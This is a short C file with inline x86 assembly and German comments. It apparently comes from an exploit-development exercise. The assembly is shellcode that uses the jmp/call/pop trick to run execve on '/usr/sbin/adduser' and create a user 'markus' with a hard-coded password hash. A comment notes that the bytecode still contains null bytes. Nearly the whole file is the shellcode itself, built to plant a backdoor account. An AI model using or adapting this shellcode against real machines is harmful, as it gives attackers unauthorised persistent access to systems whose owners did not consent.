//Mit diesem Assembler-Code kann ein User "markus" mit dem //Passwort "markus87" angelegt werden. Der Bytecode dieses //Programms enthält jedoch noch einige Null-Bytes

void main() {
__asm__("
	jmp data
start:
	popl %esi				
	movl %esi,63(%esi)			#Adresse von name[0] nach [A]		
	leal 18(%esi),%eax			#Adresse von name[1] nach [A+1]
	movl %eax,67(%esi)			
	leal 25(%esi),%eax			#Adresse von name[2] nach [A+2]
	movl %eax,71(%esi)		
	leal 28(%esi),%eax			#Adresse von name[3] nach [A+3]
	movl %eax,75(%esi)		
	movb $0x0,17(%esi)			#Endekennungen der Strings
	movb $0x0,24(%esi)
	movb $0x0,27(%esi)
	movb $0x0,62(%esi)
	movl $0x0,0x7D(%esi)			#NULL-Pointer der Pointer-Liste
	movl $0xb,%eax			#Code der SysCall-Tabelle
	movl %esi,%ebx			#Adresse von name[0]
	leal 63(%esi),%ecx			#Adresse [A] nach ECX (name[])
	leal 0x7D(%esi),%edx			#Adresse des Nullpointers nach EDX

	int $0x80

	movl $0x1,%eax
	movl $0x0,%ebx
	int $0x80	
data:
	call start	#  -68
	.string \"/usr/sbin/adduser#markus#-p#$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0#\"
	");
}
